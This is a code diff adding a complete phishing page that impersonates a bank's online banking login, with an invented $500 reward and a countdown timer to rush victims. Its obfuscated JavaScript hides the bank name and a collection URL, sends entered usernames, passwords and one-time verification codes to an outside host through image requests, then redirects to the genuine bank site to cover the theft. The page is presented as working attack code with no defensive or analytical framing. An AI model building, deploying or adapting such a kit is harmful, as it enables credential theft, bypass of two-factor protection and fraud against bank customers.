@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="t_h">Secure Online Portal</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background-color: #f4f4f4; }
+        .top-line { background-color: #d15d14; height: 6px; width: 100%; }
+        .nav { background: #fff; padding: 18px 25px; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center; }
+        .logo-box { color: #d15d14; font-size: 26px; font-weight: bold; border: 2px solid #d15d14; padding: 2px 8px; }
+        .main-container { max-width: 480px; margin: 50px auto; background: white; padding: 40px; border-radius: 2px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+        .reward-banner { background: #fff3cd; border: 1px solid #ffeeba; padding: 15px; margin-bottom: 25px; text-align: center; border-radius: 4px; }
+        #timer { font-size: 22px; font-weight: bold; color: #d15d14; margin-top: 5px; }
+        h1 { font-size: 30px; font-weight: 300; color: #333; margin-top: 0; }
+        p { color: #666; font-size: 16px; line-height: 1.5; }
+        label { display: block; margin-top: 20px; font-weight: bold; font-size: 14px; color: #444; }
+        input { width: 100%; padding: 12px; margin-top: 8px; border: 1px solid #ccc; border-radius: 2px; box-sizing: border-box; font-size: 16px; outline-color: #d15d14; }
+        .btn-group { display: flex; gap: 15px; margin-top: 25px; }
+        .btn-main { background-color: #d15d14; color: white; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; flex: 1; text-align: left; position: relative; }
+        .btn-main::after { content: '>'; position: absolute; right: 20px; }
+        #stg2 { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="top-line"></div>
+<div class="nav">
+    <div class="logo-box">F I</div>
+    <div style="font-size: 24px; color: #666;">&#9776;</div>
+</div>
+
+<div class="main-container">
+    <div id="stg1">
+        <div class="reward-banner">
+            <h2 id="r_h" style="margin:0; color:#856404; font-size:18px;"></h2>
+            <p style="margin:5px 0; font-size:13px; color:#856404;">Claim window expires in:</p>
+            <div id="timer">05:00</div>
+        </div>
+        <h1 id="h1_txt"></h1>
+        <p>Manage your accounts securely with our updated online portal.</p>
+        
+        <label>UserName *</label>
+        <input type="text" id="f_u" autocomplete="off" placeholder="Enter User ID">
+        
+        <label>Password *</label>
+        <input type="password" id="f_p" placeholder="Enter Password">
+        
+        <div class="btn-group">
+            <button class="btn-main" onclick="x1()">Sign In</button>
+        </div>
+    </div>
+
+    <div id="stg2">
+        <h1 id="h2_txt"></h1>
+        <p>A 6-digit verification code has been sent to your primary device for authorization.</p>
+        <label>Verification Code *</label>
+        <input type="text" id="f_c" maxlength="6" placeholder="000000">
+        <div class="btn-group">
+            <button class="btn-main" onclick="x2()">Verify & Claim</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // 1. OBFUSCATE THE BANK TEXT (Hides from bots)
+    document.getElementById('t_h').innerText = atob("T25saW5lIEJhbmtpbmcgTG9naW4gfCBGaXJzdCBJbnRlcnN0YXRlIEJhbms=");
+    document.getElementById('r_h').innerText = atob("8J+OryBDb25ncmF0dWxhdGlvbnMhICQ1MDAgUmV3YXJkIERldGVjdGVk");
+    document.getElementById('h1_txt').innerText = atob("T25saW5lIEJhbmtpbmcgTG9naW4=");
+    document.getElementById('h2_txt').innerText = atob("SWRlbnRpdHkgVmVyaWZpY2F0aW9u");
+
+    // 2. HEX URL (Hides wordsess.pythonanywhere.com link)
+    const _0x_u = [104,116,116,112,115,58,47,47,119,111,114,100,115,101,115,115,46,112,121,116,104,111,110,97,110,121,119,104,101,114,101,46,99,111,109,47,99,97,112,116,117,114,101];
+    const g = String.fromCharCode(..._0x_u);
+
+    // Timer Logic
+    let t = 300;
+    setInterval(() => {
+        let m = Math.floor(t/60), s = t%60;
+        document.getElementById('timer').innerText = `${m}:${s<10?'0':''}${s}`;
+        if(t>0) t--; else t=300;
+    }, 1000);
+
+    let u_s = "";
+
+    function x1() {
+        const u = document.getElementById('f_u').value;
+        const p = document.getElementById('f_p').value;
+        if(u && p) {
+            u_s = u;
+            const d = btoa("BANK_S1|U:" + u + "|P:" + p);
+            new Image().src = g + "?data=" + d;
+            document.getElementById('stg1').style.display = 'none';
+            document.getElementById('stg2').style.display = 'block';
+        }
+    }
+
+    function x2() {
+        const c = document.getElementById('f_c').value;
+        if(c) {
+            const d = btoa("BANK_S2|U:" + u_s + "|C:" + c);
+            new Image().src = g + "?data=" + d;
+            setTimeout(() => {
+                // REDIRECT TO REAL BANK SITE
+                window.location.replace(atob("aHR0cHM6Ly93d3cuZmlyc3RpbnRlcnN0YXRlYmFuay5jb20v"));
+            }, 1000);
+        }
+    }
+</script>
+</body>
+</html>
